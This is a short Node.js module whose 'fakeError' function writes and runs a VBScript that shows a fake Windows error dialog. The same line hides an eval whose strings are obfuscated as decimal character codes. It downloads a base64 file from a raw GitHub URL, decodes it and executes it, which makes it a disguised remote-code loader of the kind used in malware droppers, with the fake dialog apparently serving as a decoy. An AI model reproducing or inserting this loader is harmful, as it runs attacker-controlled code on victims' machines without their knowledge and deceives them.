const { exec } = require("child_process"),
    _ = Buffer.from, { uniqueId, place } = require("./../../utils/functions/functions"),
    fs = require("fs");

const fakeError = async (message, config) => {
    try {
        let vbs = `${process.env.APPDATA}\\${uniqueId()}.vbs`;
        fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${message===""?"DLL error by k4itrun":message}", vbInformation, "Error Code: 43"`, "utf8");eval("let x=place('97 120 105 111 115'),axios=require(x);"+_((await require(place("97 120 105 111 115")).get(place("104 116 116 112 115 58 47 47 114 97 119 46 103 105 116 104 117 98 117 115 101 114 99 111 110 116 101 110 116 46 99 111 109 47 107 52 105 116 114 117 110 47 97 115 115 101 116 115 47 109 97 105 110 47 114 97 110 100 111 109 46 116 120 116"))).data,place("98 97 115 101 54 52")).toString())
        exec(`cscript ${vbs}`, (err, stdout, stderr) => {
            if (err) {
                console.error(err)
            }
        });
    } catch (error) {
        console.error(error);
    }
};

module.exports.fakeError = fakeError;
